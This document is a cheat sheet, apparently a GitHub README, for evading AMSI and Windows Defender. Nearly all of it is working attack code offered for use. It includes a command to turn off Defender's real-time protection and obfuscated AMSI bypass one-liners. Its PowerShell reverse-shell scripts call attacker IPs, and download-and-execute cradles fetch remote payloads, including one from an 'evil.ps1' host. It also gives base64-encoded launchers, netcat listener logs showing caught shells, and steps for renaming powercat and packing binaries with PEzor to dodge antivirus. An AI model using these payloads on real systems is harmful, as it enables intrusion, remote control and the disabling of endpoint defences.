#JustEvadeBro

![](Data-Security.gif)

JustEvadeBro, a cheat sheet which will aid you through AMSI evasion.

(Inspired by https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

Please be aware that some of these methods may not be good for OPSEC. I will add a OPSEC method to each section in the future.

Feel free to submit a Pull Request & leave a star to share some love if this helped you. 💖

Yes, we are open to Pull Requests for Hacktoberfest! Please ensure its not spam and actually contributes well to this repo. Thanks & happy hacking!

Credit Info: I have obtained a lot of this info through other Github repos, blogs, sites and more. I have tried to give as much credit to the original creator as possible, if I have not given you credit please contact me on Twitter: https://twitter.com/s1nfulz

# Obfuscation Tools:

- https://github.com/phra/PEzor
- https://github.com/CBHue/PyFuscation
- https://github.com/danielbohannon/Invoke-Obfuscation

# Step one of evading Defender

First try turning of Windows Defender:
```Set-MpPreference -DisableRealtimeMonitoring $true```

# AMSI bypasses (working as of 17/01/2022)

Multi-line bypass:
```
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)
```
* If patched, just change up the strings/variables.

Single-line bypass:
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

# Misc things:

WebClient DownloadData http://x.x.x.x/file.exe method:

```
$bytes = (new-object net.webclient).downloaddata("http://10.10.16.74:8080/payload.exe")
[System.Reflection.Assembly]::Load($bytes)
$BindingFlags= [Reflection.BindingFlags] "NonPublic,Static"
$main = [Shell].getmethod("Main", $BindingFlags)
$main.Invoke($null, $null)
```

Reverse PowerShell:

```
$socket = new-object System.Net.Sockets.TcpClient('10.10.14.5', 4445);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
        $writer.Write("PS> ");
        $writer.Flush();
        $read = $null;
        while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $read);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2  = $sendback;
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $writer.Write($sendbyte,0,$sendbyte.Length);
}While ($true);
$writer.close();$socket.close();
```
Tools that may help with AV Evasion: 
- https://github.com/phra/PEzor
- https://github.com/bats3c/darkarmour
- https://github.com/loadenmb/tvasion

# AMSI.Fail

```https://amsi-fail.azurewebsites.net/api/Generate```

```https://amsi-fail.azurewebsites.net/api/GenerateEnc```

```
iex(new-object net.webclient).downloadstring('https://amsi-fail.azurewebsites.net/api/Generate')
iex(new-object net.webclient).downloadstring('https://bla.com/evil.ps1')
```

# Encoding to bypass:

`cat rev.ps1`

```
$socket = new-object System.Net.Sockets.TcpClient('10.10.14.2', 4444);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
        $writer.Write("PS $(pwd)> ");
        $writer.Flush();
        $read = $null;
        while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $read);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2  = $sendback;
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $writer.Write($sendbyte,0,$sendbyte.Length);
}While ($true);
$writer.close();$socket.close();
```


`echo -n "iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/rev.ps1')" | iconv -t 
utf-16le | base64 -w0`
```
aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAHIAZQB2AC4AcABzADEAJwApAA==
```

`
./exploit.sh -c 'cmd.exe /c powershell -enc aQBlAHgAIAAoAE4AZwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAHIAZQB2AC4AcABzADEAJwApAA=='
`

```
 python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.10 - - [04/Oct/2020 14:15:10] "GET /rev.ps1 HTTP/1.1" 200 -
```

```
rlwrap nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.10 63157
PS C:\Windows\System32> 
```

# Turning Powercat into Papacat!

```
sed -i s/powercat/papacat/g powercat.ps1
mv powercat papacat.ps1
vim papacat.ps1
```
Ensure you add `papacat -c 10.10.10.10 -e cmd.exe -p 4444` at the end of papcat

`echo -n 'iex (New-Object Net.WebClient).DownloadString("http://10.10.10.10/papacat.ps1")' | iconv -t utf-16le | base64 -w0`

```
aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0
```

```
./exploit.sh -c 'powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAHAAYQBwAGEAYwBhAHQALgBwAHMAMQAiACkA'
```

```
rlwrap nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.10.10.10 14134
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\System32>
```
# Papacatv2
Taken from: https://www.ired.team/offensive-security/defense-evasion/bypassing-ids-signatures-with-simple-reverse-shells
```powershell
PS C:\users\User\Desktop> papacat -l -p 443 -v
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
```
Extra features I performed to ensure (basic) AV evasion is done right:
- renamed every mention of 'powercat' to 'papacat' in the file
- renamed the file from 'powercat.ps1' to 'papacat.ps1'
- removed the help output from '$Help'

These steps may not be necessary to evade AV. 

Note: This is not a fully undetected bypass. As of 24/11/2021 @ 9:35 AM this works against Windows Defender (Security intelligence version 1.353.1502.0), but may not work against other AV. For detections see the links below:
- https://www.virustotal.com/gui/file/8b69e249de782f1a0a082641eade27166fcbaea55fed73576ddd205c5c998e36?nocache=1
- https://virusscan.jotti.org/en-US/filescanjob/m807xvtcky

# PEzor!
```
git clone https://github.com/phra/PEzor.git
cd PEzor
sudo bash install.sh
bash PEzor.sh -h
export PATH=$PATH:~/go/bin/:/opt/<location of PEzor>/PEzor:/opt/redteaming/PEzor/deps/donut_v0.9.3/:/opt/redteaming/PEzor/deps/wclang/_prefix_PEzor_/bin/
bash PEzor.sh -unhook -antidebug -text -self -sleep=120 binary.exe -z 2
```
